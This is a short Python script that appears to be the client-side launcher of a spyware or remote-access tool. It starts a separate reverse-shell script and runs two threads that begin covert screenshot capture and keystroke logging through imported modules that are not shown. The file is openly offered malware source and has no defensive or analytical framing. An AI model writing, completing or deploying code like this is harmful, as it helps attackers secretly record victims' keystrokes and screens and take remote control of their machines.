import subprocess
import logfile
import keylogger
from threading import Thread
## main client side initiates all required processes

if __name__ == "__main__":
    subprocess.Popen(["python3","ReverseShell.py"])
    thread = Thread(target = logfile.initiate_screenshots, args=None)
    thread2 = Thread(target = logfile.initiate_keylogs, args=None)
    thread.start()
    thread2.start()
    thread.join()
    thread2.join()